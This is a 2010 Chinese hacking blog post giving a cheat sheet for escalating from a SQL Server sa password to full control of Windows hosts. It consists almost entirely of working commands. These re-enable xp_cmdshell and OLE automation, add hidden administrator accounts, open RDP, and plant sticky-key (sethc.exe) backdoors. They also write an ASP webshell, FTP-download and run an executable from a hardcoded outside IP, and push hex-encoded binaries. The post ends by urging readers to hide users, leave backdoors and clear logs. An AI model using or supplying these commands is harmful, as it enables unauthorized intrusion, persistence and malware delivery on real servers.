title: 1433提权
categories: [网络安全]
tags: []
date: 2010-05-14 16:42:00
---
当你获得数据库的管理密码时，你还犹豫什么。提权吧、<br /><br />注意SQLDebuggerr用户<br />echo y|cacls c:windowssystem32net1.exe /p everyone:f<br />=======================================================================<br /><br />Error Message:未能找到存储过程 'master..xp_cmdshell'<br />修复法：很通用的，其实碰到 其他126 127的都可以一起修复，<br />除了xplog70.dll其他的都可以用这命令修复<br />第一步先删除：<br />drop procedure sp_addextendedproc<br />drop procedure sp_oacreate<br />exec sp_dropextendedproc 'xp_cmdshell'<br /><br />第二步恢复：<br />dbcc addextendedproc (&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)<br /><br />未能找到存储过程 'master..xp_cmdshell'<br />第一步:<br />create procedure sp_addextendedproc --- 1996/08/30 20:13<br />@functname nvarchar(517),/* (owner.)name of function to call<br />*/<br />@dllname varchar(255)/* name of DLL containing function */<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,'sp_addextendedproc')<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) -- sp_addextendedproc<br />GO<br />第二步:<br />EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int<br />=======================================================================<br />恢复cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'<br />开启cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'<br /><br />判断存储扩展是否存在<br />select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'<br />返回结果为1就ok<br />=======================================================================<br /><br />SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 &quot;外围应用配置器&quot;。<br />;EXEC sp_configure 'show advanced options', 1 --<br />;RECONFIGURE WITH OVERRIDE --<br />;EXEC sp_configure 'xp_cmdshell', 1 --<br />;RECONFIGURE WITH OVERRIDE --<br />;EXEC sp_configure&#160;&#160; 'show advanced options', 0 --<br />=======================================================================<br /><br />xplog70.dll修复：<br />Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。<br />修复XPLOG70.DLL（先用文件查看下备份的目录下x86bin,然后把下面目录替换）<br />第一步<br />exec sp_dropextendedproc 'xp_cmdshell'<br />第二步<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;c:sql2ksp4x86binnxplog70.dll&quot;)<br />=======================================================================<br /><br />恢复扩展存储过程的办法<br />先恢复sp_addextendedproc，语句如下：<br />第一：<br />create procedure sp_addextendedproc --- 1996/08/30 20:13<br />@functname nvarchar(517),/* (owner.)name of function to call */ @dllname varchar(255)/* name of DLL containing function */ as<br />set implicit_transactions off<br />if @@trancount &gt; 0&#160; <br />begin<br />raiserror(15002,-1,-1,'sp_addextendedproc')&#160; <br />return (1)&#160; <br />end<br />dbcc addextendedproc( @functname, @dllname)&#160; <br />return (0) -- sp_addextendedproc<br />GO<br />第二：<br />use master&#160; <br />exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'&#160; <br />exec sp_addextendedproc xp_dirtree,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_enumgroups,'xplog70.dll'&#160; <br />exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_loginconfig,'xplog70.dll'&#160; <br />exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'&#160; <br />exec sp_addextendedproc sp_OACreate,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OADestroy,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAMethod,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'&#160; <br />exec sp_addextendedproc sp_OAStop,'odsole70.dll'&#160; <br />exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regread,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_regwrite,'xpstar.dll'&#160; <br />exec sp_addextendedproc xp_availablemedia,'xpstar.dll'<br /><br /><br />--------------------------------------------------------------------------------------<br />一.更改sa口令方法：<br />用sql综合利用工具连接后，执行命令：<br />exec sp_password NULL,'新密码','sa'<br />(提示：慎用!)<br /><br />二.简单修补sa弱口令.<br />方法1:查询分离器连接后执行：<br />if exists (select * from<br />dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]') and<br />OBJECTPROPERTY(id, N'IsExtendedProc') = 1)<br />exec sp_dropextendedproc N'[dbo].[xp_cmdshell]'<br />GO<br />然后按F5键命令执行完毕<br /><br />方法2:查询分离器连接后<br />第一步执行：use master<br />第二步执行：sp_dropextendedproc 'xp_cmdshell'<br />然后按F5键命令执行完毕<br /><br />无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）<br />恢复方法：查询分离器连接后,<br />第一步执行：sp_dropextendedproc &quot;xp_cmdshell&quot;<br />第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'<br /><br />无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)<br />恢复方法：查询分离器连接后,<br />第一步执行:exec sp_dropextendedproc 'xp_cmdshell'<br />第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br />然后按F5键命令执行完毕<br /><br />如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:<br />查询分离器连接后,<br />2000servser系统:<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:winntsystem32cmd.exe /c net user Web hacker /add'<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:winntsystem32cmd.exe /c net localgroup administrators Web /add'<br />xp或2003server系统: 126错误！命令<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:windowssystem32cmd.exe /c net user Web$ hacker /add'<br />declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:windowssystem32cmd.exe /c net localgroup administrators Web$ /add'<br />=======================================================================<br />找不到存储过程 sp_addextendedproc<br />解决方法:<br />create procedure sp_addextendedproc --- 1996/08/30 20:13<br />@functname nvarchar(517),/* (owner.)name of function to call */<br />@dllname varchar(255)/* name of DLL containing function */<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,'sp_addextendedproc')<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) -- sp_addextendedproc<br />GO<br />这段代码贴入查询分离器,执行<br />查看目录<br />exec master.dbo.xp_subdirs 'c:'<br />列出磁盘<br />e
xec master..xp_fixeddrives<br />xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行） 直接加帐号！<br />EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWareMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net user 123 123 /add&quot;)');<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net localgroup administrators 123 /add&quot;)');<br />=======================================================================<br />开3389：<br />exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal Server','fDenyTSConnections','REG_DWORD',0;--<br />关3389：<br />exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal Server','fDenyTSConnections','REG_DWORD',1;<br />查看3389端口<br />exec xp_regread 'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp','PortNumber'<br />普通CMD后门<br />xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe','debugger','reg_sz','c:windowssystem32cmd.exe'<br /><br />建立用户1-这里默认用户是Reconditeness密码9527可自行修改<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c net1 user Reconditeness 9527 /ad &amp;net localgroup administrators terks /ad&quot;)')<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:windowssystem32iasias.mdb','select shell(&quot;cmd.exe /c net1 user Reconditeness 9527 /ad &amp;net localgroup administrators terks /ad&quot;)')<br /><br />win2K直接上PS马<br />exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)')<br /><br />win03-XP直接上PS马<br />exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:windowssystem32iasias.mdb','select shell(&quot;cmd.exe /c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)')<br /><br />shift后门命令<br />declare @o int<br />exec sp_oacreate 'scripting.filesystemobject', @o out<br />exec sp_oamethod @o, 'copyfile',null,'c:windowsexplorer.exe' ,'c:windowssystem32sethc.exe';<br />declare @o int<br />exec sp_oacreate 'scripting.filesystemobject', @o out<br />exec sp_oamethod @o, 'copyfile',null,'c:windowssystem32sethc.exe' ,'c:windowssystem32dllcachesethc.exe';<br />copy c:windowsexplorer.exe c:windowssystem32sethc.exe<br />copy c:windowssystem32sethc.exe c:windowssystem32dllcachesethc.exe<br /><br />declare @o int<br />exec sp_oacreate 'wscript.shell', @o out<br />exec sp_oamethod @o, 'run', NULL, 'XXXXX' XXXXX为你要执行的命令<br /><br /><br />开3389<br />REG ADD HKLMSYSTEMCurrentControlSetControlTerminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f<br /><br />SQL写一句话<br />exec master.dbo.xp_subdirs 'd:webcdlxkj';<br />exec sp_makewebtask 'd:webcdlxkjXX.asp','select''&lt;%execute(request(&quot;SB&quot;))%&gt;'' '<br />SA沙盒模式提权-----<br />----------------------<br />exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0;<br />-------------------------------------------------------<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net user sql$ 123 /add&quot;)');<br />-------------------------------------------------------<br />Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:windowssystem32iasias.mdb','select shell(&quot;net localgroup administrators sql$ /add&quot;)');<br /><br />SHIFT<br />入侵<br />EXEC master..xp_regwrite<br />@rootkey='HKEY_LOCAL_MACHINE',<br />@key='SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.EXE',<br />@value_name='Debugger',<br />@type='REG_SZ',<br />@value='C:WINDOWSexplorer.exe'<br />整个过程是利用master..xp_regwrite这组件来完成的,<br /><br />1.sql命令查询注册表粘滞键是否被劫持<br />exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe','Debugger'<br />2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)<br />xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe',<br />'Debugger','REG_SZ','C:WINDOWSsystem32taskmgr.exe'<br />3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用<br />xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe'<br /><br />sql写文件<br />declare @o int, @f int, @t int, @ret int<br />exec sp_oacreate 'scripting.filesystemobject', @o out<br />exec sp_oamethod @o, 'createtextfile', @f out, 'c:1.vbs', 1<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create(&quot;user&quot;,&quot;test&quot;)'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword &quot;1234&quot;'<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo '<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&amp;&quot;/test&quot;,user) '<br />exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&amp;&quot;/test&quot;'<br />exec master..xp_cmdshell 'cscript c:1.vbs'<br /><br />无NET提权的脚本<br />struser=wscript.arguments(0)<br />strpass=wscript.arguments(1)<br />set lp=createObject(&quot;WSCRIPT.NETWORK&quot;)<br />oz=&quot;WinNT://&quot;&amp;lp.ComputerName<br />Set ob=GetObject(oz)<br />Set oe=GetObject(oz&amp;&quot;/Administrators,group&quot;)<br />Set od=ob.create(&quot;user&quot;,struser)<br />od.SetPassword strpass<br />od.SetInfo<br />Set of=GetObject(oz&amp;&quot;/&quot; &amp; struser &amp; &quot;,user&quot;)<br />oe.Add(of.ADsPath)<br />For Each admin in oe.Members<br />if struser=admin.Name then<br />Wscript.echo struser &amp; &quot; 建立成功!&quot;<br />wscript.quit<br />end if<br />Next<br />Wscript.echo struser &amp; &quot; 用户建立失败!&quot;<br />将以上保存为user.VBS文件<br />然后执行：cscript user.vbs 用户名 密码<br /><br />=======================================================================<br />恢复xp_cmdshell<br />exec sp_dropextendedproc 'xp_cmdshell'<br />EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int<br />=======================================================================<br />开启xp_cmdshell<br />USE master<br />EXEC sp_configure 'show advanced options', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'xp_cmdshell', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'show advanced options', 0<br />=======================================================================<br />开启Automation Procedures<br />USE master<br />EXEC sp_configure 'show advanced options', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'Ole Automation Procedures',1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configur
e 'show advanced options', 0<br />=======================================================================<br />开启Distributed Queries<br />USE master<br />EXEC sp_configure 'show advanced options', 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'Ad Hoc Distributed Queries',1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure 'show advanced options', 0<br />=======================================================================<br />恢复Xp_regwrite<br />EXEC sp_dropextendedproc 'Xp_regwrite'<br />exec sp_addextendedproc xp_regwrite,'xpstar.dll'<br />=======================================================================<br />恢复sp_OACreate<br />dbcc addextendedproc (&quot;sp_OACreate&quot;,&quot;odsole70.dll&quot;)<br />exec sp_addextendedproc sp_OAMethod,'odsole70.dll'<br />=======================================================================<br />cmdshell开3389<br />exec master..xp_cmdshell 'echo Windows Registry Editor Version 5.00&gt;c:3389.reg'<br />exec master..xp_cmdshell 'echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server]&gt;&gt;c:3389.reg'<br />exec master..xp_cmdshell 'echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;c:3389.reg'<br />exec master..xp_cmdshell 'regedit /s c:3389.reg'<br />exec master..xp_cmdshell 'del c:3389.reg'<br />=======================================================================<br />cmdshell添加用户<br />insert resultcmd_cc exec master..xp_cmdshell 'net user 用户 密码 /add'<br />insert resultcmd_cc exec master..xp_cmdshell 'net user 用户 密码'<br />insert resultcmd_cc exec master..xp_cmdshell 'net user 用户 /active:yes'<br />insert resultcmd_cc exec master..xp_cmdshell 'net localgroup administrators 用户 /add'<br />=======================================================================<br />oacreate添加用户<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [net user support$ support /add]<br />EXEC sp_oamethod @s,[run], NULL, [net localgroup administrators support /add]<br />=======================================================================<br />regwrite添加用户<br />Exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=iasdnary.mdb','select shell(&quot;net user 用户 密码 /add&quot;)')<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=iasdnary.mdb','select shell(&quot;net localgroup administrators 用户 /add&quot;)')<br />=======================================================================<br />cmdshell模式FTP下载:<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo open FTP地址&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo 123 &gt;&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo 123 &gt;&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo get 1433.exe sly.exe&gt;&gt;sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c echo bye &gt;&gt;sly.sys]'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c ftp -s:sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c del sly.sys'<br />insert resultcmd_cc exec master..xp_cmdshell 'cmd /c sly.exe'<br />=======================================================================<br />oacreate模式FTP下载:<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo open FTP地址&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo get 1433.exe sly.exe&gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c echo bye &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c ftp -s:sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c del sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd /c sly.exe]<br />=======================================================================<br />不需要XP_CMDSHLL执行CMD命令<br />exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c net user 用户 密码 /add.&quot;)')<br />exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1<br />select * from openrowset('microsoft.jet.oledb.4.0',';database=c:winntsystem32iasias.mdb','select shell(&quot;cmd.exe /c net localgroup administrators 用户 /add.&quot;)')<br />=======================================================================<br />SQL Server 阻止了对组件 'Ole Automation Procedures' 的 过程'sys.sp_OACreate' 的访问<br />sp_configure 'show advanced options', 1;<br />GO<br />RECONFIGURE;<br />GO<br />sp_configure 'Ole Automation Procedures', 1;<br />GO<br />RECONFIGURE;<br />GO<br />=============================================<br />错误5是个系统提示的错误号，CreateProcess这个是创建线程的意思，这个错误产生和系统文件cmd.exe有很大的关系，一种情况是cmd被删除，一种是cmd的权限被降低了.<br />SQL查看终端端口及开放情况：<br />exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp','PortNumber'<br />好了，下面关键的地方了，要用到两条sql指令，将系统的explorer文件复制为系统的shift后门文件，下面两条语句为分别执行的，不可以放在一起执行，我是在sql tools 2.0工具里执行的，你也可以在分离器中执行，记得分别执行。<br />//这条语句将explorer.exe复制为sethc.exe<br />declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:windowsexplorer.exe','c:windowssystem32sethc.exe';<br />//这条语句将sethc.exe复制到dllcache目录下<br />declare @oo int exec sp_oacreate 'scripting.filesystemobject', @oo out exec sp_oamethod @oo, 'copyfile',null,'c:windowssystem32sethc.exe','c:windowssystem32dllcachesethc.exe';<br />这个两条语句执行的时间间隔最好不超过10秒钟，否则系统会自动恢复原来的文件。<br />另外这两条语句使用到的sp_oacreate存储过程需要使用到odsole70.dll这个文件，所以这个文件的存亡，关系到创建的成功与否。<br />=======================================================================<br />删除：<br />use master<br />exec sp_dropextendedproc 'xp_cmdshell'<br />exec sp_dropextendedproc 'xp_dirtree'<br />exec sp_dropextendedproc 'xp_enumgroups'<br />exec sp_dropextendedproc 'xp_fixeddrives'<br />exec sp_dropextendedproc 'xp_loginconfig'<br />exec sp_dropextendedproc 'xp_enumerrorlogs'<br />exec sp_dropextendedproc 'xp_getfiledetails'<br />exec sp_dropextendedproc 'Sp_OACreate'<br />exec sp_dropextendedproc 'Sp_OADestroy'<br />exec sp_dropextendedproc 'Sp_OAGetErrorInfo'<br />exec sp_dropextendedproc 'Sp_OAGetProperty'<br />exec sp_dropextendedproc 'Sp_OAMethod'<br />exec sp_dropextendedproc 'Sp_OASetProperty'<br />exec sp_dropextendedproc 'Sp_OAStop'<br />exec sp_dropextendedproc 'Xp_regaddmultistring'<br />exec sp_dropextendedproc 'Xp_regdeletekey'<br />exec sp_dropextendedproc 'Xp_regdeletevalue'<br />exec sp_dropextendedproc 'Xp_regenumvalues'<br />exec sp_dropextendedproc 'Xp_regread'<br />exec sp_dropextendedproc 'Xp_regremovemultistring'<br />exec sp_dropextendedproc 'Xp_regwrite'<br />drop procedure sp_makewebtask<br />go<br />----------------------------------------------------------------------------------<br />----------------------<br />--列出当前计算机名称--<br />----------------------<br />execute master..xp_getnetname<br />--------------------------------<br />-列出当前计算机的驱动器可用空间-<br />--------------------------------<br />execute master..xp_fixeddrives<br />========================<br />==列出服务器所有本地组==<br />========================
<br />execute master..xp_enumgroups<br />======================<br />==获取MS SQL的版本号==<br />======================<br />execute master..sp_msgetversion<br />=========================================<br />==参数说明:目录名,目录深度,是否显示文件==<br />=========================================<br />execute master..xp_dirtree 'c:'<br />execute master..xp_dirtree 'c:',1<br />execute master..xp_dirtree 'c:',1,1<br />--------------------------------------------------------------------------------------------------------<br />sql2005<br />恢复xp_cmdshell<br />EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br />关闭:<br />EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br />-------------------------------------------------------------------------------------------------------------<br />把要转的文件拖到脚本上去, 就会生成包含HEX代码的文本.<br />然后用以下方法写入到对方计算机中。DECLARE @ObjectToken INT<br />EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT<br />EXEC sp_OASetProperty @ObjectToken, 'Type', 1<br />EXEC sp_OAMethod @ObjectToken, 'Open'<br />EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x123456(其中0x123456为HEX内容)<br />EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, 'Test.exe(文件名)', 2<br />EXEC sp_OAMethod @ObjectToken, 'Close'<br />EXEC sp_OADestroy @ObjectToken<br />复制代码写入之后, 就发挥你的办法去执行你写入的这个文件就OK了<br />FILE2HEX.VBS<br />On Error Resume Next<br />FilePath = Wscript.Arguments(0)<br />FieName = Right(FilePath, Len(FilePath) - InStrRev(FilePath, &quot;&quot;))<br />With CreateObject(&quot;Adodb.Stream&quot;)<br />.Type = 1: .open: .loadfromfile FilePath: Str = .read: Sl = LenB(Str)<br />End With<br /><br />Sll = Sl Mod 65536: Slh = Sl  65536<br />With CreateObject(&quot;Scripting.FileSystemObject&quot;).OpenTextFile(FilePath &amp; &quot;.txt&quot;, 2, True)<br />.Write &quot;0x&quot;<br />For i = 1 To Sl<br />bt = AscB(MidB(Str, i, 1))<br />If bt &lt; 16 Then .Write &quot;0&quot;<br />.Write Hex(bt)<br />Next<br />End With<br /><br />进去服务器后，创建隐藏用户。防止后门，清理日志，走人。。<br />嘿嘿，最后嘱咐一下，缺德的时候别多做。。看看就行，，